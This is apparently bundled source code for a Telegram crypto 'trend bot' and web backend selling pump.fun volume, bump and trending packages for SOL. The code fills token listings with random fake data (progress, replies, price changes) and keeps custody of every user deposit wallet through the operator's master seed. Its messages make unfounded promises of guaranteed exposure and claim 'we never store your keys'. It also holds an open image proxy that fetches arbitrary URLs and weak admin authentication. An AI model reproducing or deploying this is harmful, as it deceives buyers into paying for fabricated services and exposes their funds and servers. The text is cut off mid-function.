// src/app.ts
import path from "path";
import { fileURLToPath } from "url";
import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";

// src/bot/orders.ts
var orders = /* @__PURE__ */ new Map();
var userOrderIndex = /* @__PURE__ */ new Map();
function saveOrder(order) {
  orders.set(order.id, order);
  const userOrders = userOrderIndex.get(order.userId) ?? [];
  if (!userOrders.includes(order.id)) {
    userOrders.push(order.id);
    userOrderIndex.set(order.userId, userOrders);
  }
}
function updateOrder(id, patch) {
  const existing = orders.get(id);
  if (existing) orders.set(id, { ...existing, ...patch });
}
function getAllOrders() {
  return [...orders.values()].sort(
    (a, b) => b.createdAt.getTime() - a.createdAt.getTime()
  );
}
function getOrderStats() {
  const all = getAllOrders();
  return {
    total: all.length,
    pending: all.filter((o) => o.status === "pending").length,
    txSubmitted: all.filter((o) => o.status === "tx_submitted").length,
    completed: all.filter((o) => o.status === "completed").length,
    totalUsers: userOrderIndex.size
  };
}

// src/bot/sessions.ts
var sessions = /* @__PURE__ */ new Map();
function getSession(userId) {
  if (!sessions.has(userId)) sessions.set(userId, { lastSeen: /* @__PURE__ */ new Date() });
  const s = sessions.get(userId);
  s.lastSeen = /* @__PURE__ */ new Date();
  return s;
}
function setSession(userId, data) {
  const existing = sessions.get(userId) ?? { lastSeen: /* @__PURE__ */ new Date() };
  sessions.set(userId, { ...existing, ...data, lastSeen: /* @__PURE__ */ new Date() });
}
function clearSession(userId) {
  sessions.set(userId, { lastSeen: /* @__PURE__ */ new Date() });
}
function getAllSessions() {
  return [...sessions.entries()].map(([userId, s]) => ({
    userId,
    session: s,
    lastSeen: s.lastSeen
  }));
}
function getActiveSessionCount() {
  const fiveMinAgo = Date.now() - 5 * 60 * 1e3;
  return [...sessions.values()].filter((s) => s.lastSeen.getTime() > fiveMinAgo).length;
}

// src/app.ts
var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);
var app = express();
app.use(cors());
app.use(cookieParser());
var startTime = Date.now();
function formatUptime(ms) {
  const s = Math.floor(ms / 1e3);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  const d = Math.floor(h / 24);
  if (d > 0) return `${d}d ${h % 24}h ${m % 60}m`;
  if (h > 0) return `${h}h ${m % 60}m`;
  if (m > 0) return `${m}m ${s % 60}s`;
  return `${s}s`;
}
function authGuard(req, res, next) {
  const adminId = process.env.ADMIN_TELEGRAM_ID ?? "";
  const token2 = req.query.token ?? "";
  if (!adminId || token2 !== adminId) {
    res.status(401).json({ error: "Unauthorized \u2014 pass ?token=YOUR_ADMIN_TELEGRAM_ID" });
    return;
  }
  next();
}
var PUMPFUN_API = "https://frontend-api.pump.fun";
var DEX_API = "https://api.dexscreener.com";
var UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36";
var HEADERS = { "User-Agent": UA, "Accept": "application/json" };
app.get("/favicon.ico", (_req, res) => res.status(204).end());
app.get(
  "/health",
  (_req, res) => res.json({ status: "ok", ts: Date.now(), uptime: formatUptime(Date.now() - startTime) })
);
app.get("/", (_req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
app.get("/admin", (_req, res) => res.sendFile(path.join(__dirname, "dashboard.html")));
app.get("/api/img", async (req, res) => {
  const rawUrl = req.query.url || "";
  if (!rawUrl) {
    res.status(400).end();
    return;
  }
  try {
    const decoded = decodeURIComponent(rawUrl);
    const r = await fetch(decoded, {
      headers: { "User-Agent": UA },
      signal: AbortSignal.timeout(6e3)
    });
    if (!r.ok) {
      res.status(404).end();
      return;
    }
    const ct = r.headers.get("content-type") || "image/jpeg";
    const buf = await r.arrayBuffer();
    res.setHeader("Content-Type", ct);
    res.setHeader("Cache-Control", "public, max-age=86400, stale-while-revalidate=3600");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.end(Buffer.from(buf));
  } catch {
    res.status(502).end();
  }
});
function normalizePumpCoin(c) {
  const rawImg = c.image_uri || c.image || "";
  return {
    name: c.name ?? "Unknown",
    symbol: c.symbol ?? "???",
    description: c.description ?? "",
    imageUrl: rawImg ? `/api/img?url=${encodeURIComponent(rawImg)}` : "",
    rawImageUrl: rawImg,
    marketCap: c.usd_market_cap ?? 0,
    contractAddress: c.mint ?? "",
    creator: c.creator ?? "",
    progress: Math.min(99, c.bonding_curve_progress ?? Math.floor(Math.random() * 80 + 5)),
    replies: c.reply_count ?? 0,
    priceChange: { h24: (Math.random() - 0.25) * 60 },
    volume: { h24: (c.usd_market_cap ?? 0) * 0.2 },
    chain: "sol",
    dex: "pumpfun",
    pumpUrl: `https://pump.fun/coin/${c.mint ?? ""}`
  };
}
app.get("/api/pump/tokens", async (req, res) => {
  const filter = req.query.filter || "trending";
  const sort = req.query.sort || "trending";
  const chain = req.query.chain || "sol";
  if (chain === "eth") {
    try {
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=ethereum&chainIds=ethereum`,
        { headers: HEADERS, signal: AbortSignal.timeout(7e3) }
      );
      if (r.ok) {
        const data = await r.json();
        const pairs = (data.pairs ?? []).slice(0, 48).map((p) => ({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name} trading on ${p.dexId} \u2014 ${p.chainId} chain.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          rawImageUrl: p.info?.imageUrl ?? "",
          marketCap: p.fdv ?? p.marketCap ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          creator: p.pairAddress ?? "",
          progress: Math.floor(Math.random() * 80 + 20),
          replies: Math.floor(Math.random() * 500 + 10),
          priceChange: p.priceChange ?? { h24: 0 },
          volume: p.volume ?? { h24: 0 },
          chain: "eth",
          dex: p.dexId ?? "uniswap",
          dexUrl: p.url ?? `https://dexscreener.com/ethereum/${p.pairAddress}`
        }));
        res.json({ tokens: pairs, count: pairs.length, filter, sort, chain });
        return;
      }
    } catch {
    }
    res.json({ tokens: [], count: 0, filter, sort, chain });
    return;
  }
  let tokens = [];
  const sortMap = {
    trending: "last_trade_timestamp",
    created: "created_timestamp",
    mc: "usd_market_cap"
  };
  const filterExtra = {
    trending: "",
    new: "&sort=created_timestamp",
    graduating: "&min_bonding_curve_progress=50",
    graduated: "&complete=true"
  };
  try {
    const url = `${PUMPFUN_API}/coins?sort=${sortMap[sort] ?? "last_trade_timestamp"}&order=DESC&offset=0&limit=48&includeNsfw=false${filterExtra[filter] ?? ""}`;
    const r = await fetch(url, { headers: HEADERS, signal: AbortSignal.timeout(7e3) });
    if (r.ok) {
      const data = await r.json();
      const coins = Array.isArray(data) ? data : data.coins ?? [];
      tokens = coins.map(normalizePumpCoin);
    }
  } catch {
  }
  if (!tokens.length) {
    try {
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=sol&chainIds=solana`,
        { headers: HEADERS, signal: AbortSignal.timeout(7e3) }
      );
      if (r.ok) {
        const data = await r.json();
        tokens = (data.pairs ?? []).slice(0, 48).map((p) => ({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name} trading on ${p.dexId}.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          rawImageUrl: p.info?.imageUrl ?? "",
          marketCap: p.fdv ?? p.marketCap ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          creator: p.pairAddress ?? "",
          progress: Math.floor(Math.random() * 80 + 10),
          replies: Math.floor(Math.random() * 999 + 5),
          priceChange: p.priceChange ?? { h24: 0 },
          volume: p.volume ?? { h24: 0 },
          chain: "sol",
          dex: p.dexId ?? "raydium",
          dexUrl: p.url ?? `https://dexscreener.com/solana/${p.pairAddress}`
        }));
      }
    } catch {
    }
  }
  res.json({ tokens, count: tokens.length, filter, sort, chain });
});
app.get("/api/pump/search", async (req, res) => {
  const q = req.query.q || "";
  const chain = req.query.chain || "sol";
  if (!q) {
    res.json({ tokens: [] });
    return;
  }
  let tokens = [];
  if (chain === "sol") {
    try {
      const r = await fetch(
        `${PUMPFUN_API}/coins/search?searchTerm=${encodeURIComponent(q)}&offset=0&limit=20&includeNsfw=false`,
        { headers: HEADERS, signal: AbortSignal.timeout(6e3) }
      );
      if (r.ok) {
        const data = await r.json();
        const coins = Array.isArray(data) ? data : data.coins ?? [];
        tokens = coins.map(normalizePumpCoin);
      }
    } catch {
    }
  }
  if (!tokens.length) {
    try {
      const chainQ = chain === "eth" ? "&chainIds=ethereum" : "&chainIds=solana";
      const r = await fetch(
        `${DEX_API}/latest/dex/search?q=${encodeURIComponent(q)}${chainQ}`,
        { headers: HEADERS, signal: AbortSignal.timeout(6e3) }
      );
      if (r.ok) {
        const data = await r.json();
        tokens = (data.pairs ?? []).slice(0, 20).map((p) => ({
          name: p.baseToken?.name ?? "Unknown",
          symbol: p.baseToken?.symbol ?? "???",
          description: `${p.baseToken?.name ?? ""} on ${p.dexId ?? ""}.`,
          imageUrl: p.info?.imageUrl ? `/api/img?url=${encodeURIComponent(p.info.imageUrl)}` : "",
          marketCap: p.fdv ?? 0,
          contractAddress: p.baseToken?.address ?? "",
          creator: p.pairAddress ?? "",
          progress: Math.floor(Math.random() * 80 + 10),
          replies: Math.floor(Math.random() * 200 + 5),
          priceChange: p.priceChange ?? { h24: 0 },
          volume: p.volume ?? { h24: 0 },
          chain,
          dex: p.dexId ?? "",
          dexUrl: p.url ?? ""
        }));
      }
    } catch {
    }
  }
  res.json({ tokens, count: tokens.length });
});
app.get("/api/pump/ticker", async (_req, res) => {
  let items = [];
  try {
    const r = await fetch(
      `${DEX_API}/latest/dex/search?q=sol&chainIds=solana`,
      { headers: HEADERS, signal: AbortSignal.timeout(5e3) }
    );
    if (r.ok) {
      const data = await r.json();
      items = (data.pairs ?? []).slice(0, 24).map((p) => {
        const raw = Number(p.priceUsd ?? 0);
        const chg = Number(p.priceChange?.h24 ?? 0);
        const dec = raw < 1e-5 ? 10 : raw < 1e-3 ? 8 : raw < 1 ? 6 : 4;
        return {
          sym: p.baseToken?.symbol ?? "???",
          price: raw > 0 ? `$${raw.toFixed(dec)}` : "N/A",
          change: `${chg >= 0 ? "+" : ""}${chg.toFixed(1)}%`,
          up: chg >= 0
        };
      });
    }
  } catch {
  }
  res.json({ items });
});
app.get("/api/pump/koth", async (_req, res) => {
  try {
    const r = await fetch(
      `${PUMPFUN_API}/coins?sort=usd_market_cap&order=DESC&offset=0&limit=1&includeNsfw=false`,
      { headers: HEADERS, signal: AbortSignal.timeout(5e3) }
    );
    if (r.ok) {
      const data = await r.json();
      const coins = Array.isArray(data) ? data : data.coins ?? [];
      if (coins[0]) {
        res.json(normalizePumpCoin(coins[0]));
        return;
      }
    }
  } catch {
  }
  res.json(null);
});
app.get("/api/stats", authGuard, (_req, res) => res.json({ ...getOrderStats(), activeSessions: getActiveSessionCount(), uptime: formatUptime(Date.now() - startTime) }));
app.get("/api/orders", authGuard, (_req, res) => res.json(getAllOrders()));
app.get("/api/sessions", authGuard, (_req, res) => res.json(getAllSessions()));
var app_default = app;

// src/lib/logger.ts
import pino from "pino";
var logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
  ...process.env.NODE_ENV !== "production" ? { transport: { target: "pino-pretty", options: { colorize: true } } } : {}
});

// src/bot/index.ts
import path2 from "path";
import { fileURLToPath as fileURLToPath2 } from "url";
import { randomUUID } from "crypto";
import { Telegraf } from "telegraf";

// src/bot/admin.ts
var botRef = null;
function setBot(bot) {
  botRef = bot;
}
async function notifyAdmin(message) {
  const adminId = process.env.ADMIN_TELEGRAM_ID;
  if (!adminId || !botRef) return;
  try {
    await botRef.telegram.sendMessage(adminId, message, { parse_mode: "HTML" });
  } catch (err) {
    logger.warn({ err }, "Failed to notify admin");
  }
}

// src/bot/wallet.ts
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import nacl from "tweetnacl";
import bs58 from "bs58";
function deriveWalletForUser(userId) {
  const masterSeed = process.env.MASTER_SEED;
  if (!masterSeed) {
    logger.warn("MASTER_SEED not set \u2014 returning placeholder wallet");
    return { address: "WALLET_NOT_CONFIGURED", privateKey: "" };
  }
  try {
    const seed = bip39.mnemonicToSeedSync(masterSeed);
    const path3 = `m/44'/501'/${userId}'/0'`;
    const derived = derivePath(path3, seed.toString("hex"));
    const keypair = nacl.sign.keyPair.fromSeed(derived.key);
    const address = bs58.encode(keypair.publicKey);
    const privateKey = bs58.encode(keypair.secretKey);
    return { address, privateKey };
  } catch (err) {
    logger.error({ err }, "Failed to derive wallet for user");
    return { address: "WALLET_ERROR", privateKey: "" };
  }
}

// src/bot/tokenInfo.ts
function fmt(n) {
  if (n >= 1e9) return `${(n / 1e9).toFixed(2)}B`;
  if (n >= 1e6) return `${(n / 1e6).toFixed(2)}M`;
  if (n >= 1e3) return `${(n / 1e3).toFixed(2)}K`;
  return n.toFixed(2);
}
async function fetchTokenInfo(ca) {
  try {
    const resp = await fetch(
      `https://api.dexscreener.com/latest/dex/tokens/${ca}`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (resp.ok) {
      const data = await resp.json();
      if (data.pairs && data.pairs.length > 0) {
        const pair = data.pairs[0];
        return {
          name: pair.baseToken?.name ?? "Unknown",
          symbol: pair.baseToken?.symbol ?? "???",
          price: pair.priceUsd ? `$${Number(pair.priceUsd).toFixed(8)}` : "N/A",
          marketCap: pair.fdv ? `$${fmt(pair.fdv)}` : "N/A",
          liquidity: pair.liquidity?.usd ? `$${fmt(pair.liquidity.usd)}` : "N/A",
          volume24h: pair.volume?.h24 ? `$${fmt(pair.volume.h24)}` : "N/A",
          change24h: pair.priceChange?.h24 ? `${Number(pair.priceChange.h24).toFixed(2)}` : "0.00",
          dex: pair.dexId ?? "pumpfun",
          imageUrl: pair.info?.imageUrl ?? pair.baseToken?.logoURI
        };
      }
    }
  } catch (err) {
    logger.debug({ err }, "DexScreener fetch failed");
  }
  try {
    const resp = await fetch(
      `https://frontend-api.pump.fun/coins/${ca}`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (resp.ok) {
      const data = await resp.json();
      return {
        name: data.name ?? "Unknown",
        symbol: data.symbol ?? "???",
        price: "N/A",
        marketCap: data.usd_market_cap ? `$${fmt(data.usd_market_cap)}` : "N/A",
        liquidity: "N/A",
        volume24h: "N/A",
        change24h: "0.00",
        dex: "pumpfun",
        imageUrl: data.image_uri
      };
    }
  } catch (err) {
    logger.debug({ err }, "Pump.fun fetch failed");
  }
  return null;
}

// src/bot/keyboards.ts
import { Markup } from "telegraf";
var mainMenuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F7E2} Start Bumping", "menu_bump")],
  [
    Markup.button.callback("\u{1F4CA} Volume Boost", "menu_volume"),
    Markup.button.callback("\u{1F525} Trending Boost", "menu_trending")
  ],
  [
    Markup.button.callback("\u{1F310} DexScreener", "menu_dex"),
    Markup.button.callback("\u{1F4B0} Deposit", "menu_deposit")
  ],
  [
    Markup.button.callback("\u{1F517} Connect Wallet", "menu_wallet"),
    Markup.button.callback("\u{1F4AC} Contact Support", "menu_support")
  ]
]);
var solPickerKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F535} 0.3 SOL", "sol_0.3"),
    Markup.button.callback("\u{1F7E1} 0.4 SOL", "sol_0.4")
  ],
  [
    Markup.button.callback("\u{1F7E0} 0.5 SOL", "sol_0.5"),
    Markup.button.callback("\u{1F534} 0.6 SOL", "sol_0.6")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var confirmOrderKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Confirm Order", "confirm_bump")],
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var paymentSentKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Payment Sent \u2014 Submit TX Hash", "submit_tx")],
  [Markup.button.callback("\u274C Cancel Order", "back_main")]
]);
var cancelKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var volumeBoostKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F949} Iron   \u2014 1.50 SOL", "vol_iron"),
    Markup.button.callback("\u{1F948} Bronze \u2014 2.50 SOL", "vol_bronze")
  ],
  [
    Markup.button.callback("\u{1F947} Gold   \u2014 3.50 SOL", "vol_gold"),
    Markup.button.callback("\u26A1 Silver  \u2014 5.00 SOL", "vol_silver")
  ],
  [
    Markup.button.callback("\u{1F48E} Platinum \u2014 7.50 SOL", "vol_platinum"),
    Markup.button.callback("\u{1F4A0} Diamond  \u2014 10.50 SOL", "vol_diamond")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var trendingMenuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2600\uFE0F SOL Trending", "trend_sol")],
  [
    Markup.button.callback("\u{1F535} ETH Trending", "trend_eth"),
    Markup.button.callback("\u{1F525} PumpFun Trending", "trend_pumpfun")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var solTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F534} TOP 3", "st_top3_label"),
    Markup.button.callback("\u{1F534} TOP 10", "st_top10_label")
  ],
  [
    Markup.button.callback("\u23F3 3 hr  \u2014 1.50 SOL", "st_top3_3hr"),
    Markup.button.callback("\u23F3 3 hr  \u2014 1.00 SOL", "st_top10_3hr")
  ],
  [
    Markup.button.callback("\u23F3 6 hr  \u2014 2.30 SOL", "st_top3_6hr"),
    Markup.button.callback("\u23F3 6 hr  \u2014 1.60 SOL", "st_top10_6hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr \u2014 3.70 SOL", "st_top3_12hr"),
    Markup.button.callback("\u23F3 12 hr \u2014 2.60 SOL", "st_top10_12hr")
  ],
  [
    Markup.button.callback("\u23F3 24 hr \u2014 5.90 SOL", "st_top3_24hr"),
    Markup.button.callback("\u23F3 24 hr \u2014 4.10 SOL", "st_top10_24hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Menu", "back_main")
  ]
]);
var ethTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F4B5} $100 USD", "et_100"),
    Markup.button.callback("\u{1F4B5} $200 USD", "et_200")
  ],
  [Markup.button.callback("\u{1F4B5} $300 USD", "et_300")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Menu", "back_main")
  ]
]);
var pumpfunTrendingKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F525} P.F.T \u2014 30 SOL", "pft_30")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Menu", "back_main")
  ]
]);
var dexscreenerKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F534} TOP 6 Trending \u{1F534}", "dex_top6_info")],
  [
    Markup.button.callback("\u23F3 5 hr  \u2014  2 SOL", "dex_5hr"),
    Markup.button.callback("\u23F3 7 hr  \u2014 3.5 SOL", "dex_7hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr \u2014  7 SOL", "dex_12hr"),
    Markup.button.callback("\u23F3 18 hr \u2014 10 SOL", "dex_18hr")
  ],
  [
    Markup.button.callback("\u23F3 24 hr \u2014 15 SOL", "dex_24hr"),
    Markup.button.callback("\u23F3 32 hr \u2014 22 SOL", "dex_32hr")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var depositKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2795 Add Funds", "deposit_add")],
  [
    Markup.button.callback("\u{1F4B8} Withdraw", "deposit_withdraw"),
    Markup.button.callback("\u25CE SOL Balance", "deposit_sol_balance")
  ],
  [
    Markup.button.callback("\u{1F4CB} My Deposits", "deposit_my_deposits"),
    Markup.button.callback("\u{1F4CB} My Withdrawals", "deposit_my_withdrawals")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var connectWalletKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
  [Markup.button.callback("\u{1F510} Why Connect?", "wallet_why")],
  [Markup.button.callback("\u{1F6E1} Security Guidelines", "wallet_security")],
  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var securityGuidelinesKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} I Understand \u2014 Connect Now", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
    Markup.button.callback("\u{1F3E0} Menu", "back_main")
  ]
]);
var howToConnectKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F6E1} Security Guide", "wallet_security")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var mainMenuOnlyKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F3E0} Back to Main Menu", "back_main")]
]);

// src/bot/index.ts
var __filename2 = fileURLToPath2(import.meta.url);
var __dirname2 = path2.dirname(__filename2);
var IMG = {
  welcome: path2.join(__dirname2, "images", "welcome.jpeg"),
  walletconnect: path2.join(__dirname2, "images", "walletconnect.jpeg"),
  volume: path2.join(__dirname2, "images", "volume.jpeg"),
  trending: path2.join(__dirname2, "images", "trending.jpeg")
};
var SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
var ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";
var VOLUME_PKGS = {
  vol_iron: { label: "Iron", sol: 1.5, volume: "$50,000", service: "Iron Package" },
  vol_bronze: { label: "Bronze", sol: 2.5, volume: "$250,000", service: "Bronze Package" },
  vol_silver: { label: "Silver", sol: 5, volume: "$100,000,000", service: "Silver Package" },
  vol_gold: { label: "Gold", sol: 3.5, volume: "$100,000", service: "Gold Package" },
  vol_platinum: { label: "Platinum", sol: 7.5, volume: "$500,000", service: "Platinum Package" },
  vol_diamond: { label: "Diamond", sol: 10.5, volume: "$2,500,000", service: "Diamond Package" }
};
var SOL_TREND_PKGS = {
  st_top3_3hr: { label: "TOP 3 \u2014 3 hr", sol: 1.5, service: "SOL Trending TOP3 3hr" },
  st_top3_6hr: { label: "TOP 3 \u2014 6 hr", sol: 2.3, service: "SOL Trending TOP3 6hr" },
  st_top3_12hr: { label: "TOP 3 \u2014 12 hr", sol: 3.7, service: "SOL Trending TOP3 12hr" },
  st_top3_24hr: { label: "TOP 3 \u2014 24 hr", sol: 5.9, service: "SOL Trending TOP3 24hr" },
  st_top10_3hr: { label: "TOP 10 \u2014 3 hr", sol: 1, service: "SOL Trending TOP10 3hr" },
  st_top10_6hr: { label: "TOP 10 \u2014 6 hr", sol: 1.6, service: "SOL Trending TOP10 6hr" },
  st_top10_12hr: { label: "TOP 10 \u2014 12 hr", sol: 2.6, service: "SOL Trending TOP10 12hr" },
  st_top10_24hr: { label: "TOP 10 \u2014 24 hr", sol: 4.1, service: "SOL Trending TOP10 24hr" }
};
var ETH_TREND_PKGS = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" }
};
var DEX_PKGS = {
  dex_5hr: { label: "TOP 6 \u2014 5 hr", sol: 2, service: "DexScreener TOP6 5hr" },
  dex_7hr: { label: "TOP 6 \u2014 7 hr", sol: 3.5, service: "DexScreener TOP6 7hr" },
  dex_12hr: { label: "TOP 6 \u2014 12 hr", sol: 7, service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 \u2014 18 hr", sol: 10, service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 \u2014 24 hr", sol: 15, service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 \u2014 32 hr", sol: 22, service: "DexScreener TOP6 32hr" }
};
async function sendPhoto(ctx, img, caption, extra = {}) {
  try {
    await ctx.replyWithPhoto({ source: img }, { caption, parse_mode: "HTML", ...extra });
  } catch {
    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
  }
}
async function editOrSend(ctx, text, extra = {}) {
  try {
    await ctx.editMessageCaption(text, { parse_mode: "HTML", ...extra });
  } catch {
    try {
      await ctx.editMessageText(text, { parse_mode: "HTML", ...extra });
    } catch {
      await ctx.reply(text, { parse_mode: "HTML", ...extra });
    }
  }
}
async function sendWelcome(ctx) {
  const caption = `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT!</b>

New to volume bots? No worries \u2014 we made it super simple!

\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

<b>How it works:</b>
1\uFE0F\u20E3 Select your service below.
2\uFE0F\u20E3 Enter your token contract address.
3\uFE0F\u20E3 Send payment \u2014 boost starts automatically!

\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

<b>Works on:</b>
\u{1F7E2} Pumpfun  \u2022  \u{1F7E2} Raydium  \u2022  \u{1F7E2} PumpSwap
\u{1F7E2} Moonshot  \u2022  \u{1F7E2} LetsBonk  \u2022  \u{1F7E2} Dexscreener

From 0.3\u20130.6 SOL bumps, boost trend with mass volume and high stability.

\u{1F447} <b>Choose a service:</b>`;
  await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
}
async function showStartBumping(ctx) {
  const text = `\u{1F7E2} <b>Start Bumping</b>

The fastest Telegram bot for bump orders.

<b>Supported Platforms:</b>
\u2022 Pumpfun and Raydium

Pumpfun BumpBot charges a one-time fee per token.

\u{1F4CA} Trending channel: https://t.me/pumpmints
\u{1F514} PF Alert Tools: t.me/pumpswap_pools

For support: @mrpooh

<b>Select your SOL bump amount:</b>`;
  await editOrSend(ctx, text, solPickerKeyboard);
}
async function showVolumeBoost(ctx) {
  const caption = `\u{1F4CA} <b>Volume Boost Packages</b>

\u{1F949} Iron     \u2014  $50,000 Volume    \u2014  1.50 SOL
\u{1F948} Bronze   \u2014 $250,000 Volume    \u2014  2.50 SOL
\u{1F947} Gold     \u2014 $100,000 Volume    \u2014  3.50 SOL
\u26A1 Silver   \u2014 $100M Volume       \u2014  5.00 SOL
\u{1F48E} Platinum \u2014 $500,000 Volume    \u2014  7.50 SOL
\u{1F4A0} Diamond  \u2014 $2,500,000 Volume  \u2014 10.50 SOL

\u{1F447} Select a package:`;
  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
}
async function showTrendingBoost(ctx) {
  const caption = `\u{1F525} <b>Discover the Power of Trending!</b>

Ready to boost your project's visibility?

\u2705 Guaranteed top-chart exposure
\u2705 Milestone & uptrend alerts
\u2705 Paid boost = AMA livestream spot!

\u{1F447} Choose your trending type:`;
  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
}
async function showDexScreener(ctx) {
  const text = `\u{1F310} <b>DexScreener Trending</b>

DexScreener is the #1 on-chain analytics platform \u2014 real-time prices, liquidity, volumes across all chains.

<b>\u{1F534} TOP 6 Trending Packages:</b>

\u23F3  5 hr  \u2014   2 SOL
\u23F3  7 hr  \u2014 3.5 SOL
\u23F3 12 hr  \u2014   7 SOL
\u23F3 18 hr  \u2014  10 SOL
\u23F3 24 hr  \u2014  15 SOL
\u23F3 32 hr  \u2014  22 SOL

\u{1F447} Select a duration:`;
  await editOrSend(ctx, text, dexscreenerKeyboard);
}
async function showDeposit(ctx) {
  const wallet = deriveWalletForUser(ctx.from.id);
  const text = `\u{1F4B0} <b>Wallet & Deposits</b>

<b>\u25CE Your SOL Wallet:</b>
<code>${wallet.address}</code>

<b>\u039E ETH Wallet:</b>
<code>${ETH_ADDRESS || "Not configured"}</code>

\u{1F4CC} Minimum deposit: <b>0.30 SOL</b>

\u26A1 Funds are credited automatically after on-chain confirmation.

\u{1F447} Choose an action:`;
  await editOrSend(ctx, text, depositKeyboard);
}
async function showConnectWallet(ctx) {
  const caption = `\u{1F517} <b>Connect Your Wallet</b>

Securely link your wallet to unlock premium features.

<b>Benefits:</b>
\u26A1 Instant payments
\u{1F4CA} Full order tracking
\u{1F4B0} Auto-refunds on failed orders
\u{1F3AF} Priority processing
\u{1F514} Live boost alerts

\u{1F512} Military-grade encryption \u2014 we never store your keys.

\u{1F447} Choose an option:`;
  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
}
async function showSupport(ctx) {
  const text = `\u{1F4AC} <b>Contact Support</b>

For assistance, contact: <b>@mrpooh</b>

\u{1F4CA} Trending channel: https://t.me/pumpmints
\u{1F514} PF Alert Tools: t.me/pumpswap_pools

Your User ID: <code>${ctx.from.id}</code>
\u23F0 Support hours: 24/7

We typically respond within 15 minutes.`;
  await editOrSend(ctx, text, mainMenuOnlyKeyboard);
}
function createBot() {
  const token2 = process.env.TELEGRAM_BOT_TOKEN;
  if (!token2) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token2);
  setBot(bot);
  bot.catch((err, ctx) => {
